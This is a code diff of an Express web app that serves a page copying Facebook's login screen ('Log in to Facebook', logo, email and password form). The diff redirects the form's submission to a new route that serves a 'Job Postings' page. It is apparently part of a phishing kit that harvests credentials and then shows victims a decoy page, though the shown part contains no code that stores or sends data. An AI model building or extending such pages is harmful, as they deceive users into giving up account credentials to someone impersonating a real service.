@@ -68,6 +68,11 @@ app.get('/success', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in to Facebook</title>
     <link rel="stylesheet" href="/fbloginstyle.css">
+    <script>
+                function goToAnotherPage() {
+                    window.location.href = '/another-page'; // Redirects to another page
+                }
+            </script>
 </head>
 
     <style>
@@ -165,7 +170,7 @@ app.get('/success', (req, res) => {
     <img src="images/fbloginlogo.png" class="fblogo" alt="fblogo">
     <div class="login-container">
         <h2 style="font-size: 17px; font-weight: bold; color: #504e4e; margin-bottom: 48px; font-family: sans-serif;">Log in to Facebook</h2>
-        <form action="/submit-login" method="POST">
+        <form action="/another-page" method="POST">
             <div class="form-group">
                 <input placeholder="Email address or Phone number" type="text" id="username" name="username" required>
             </div>
@@ -192,6 +197,9 @@ app.get('/success', (req, res) => {
     `);
 });
 
+app.get('/another-page', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'Job Postings2.html'));
+});
 
 // Routes to serve HTML files
 app.get('/', (req, res) => {
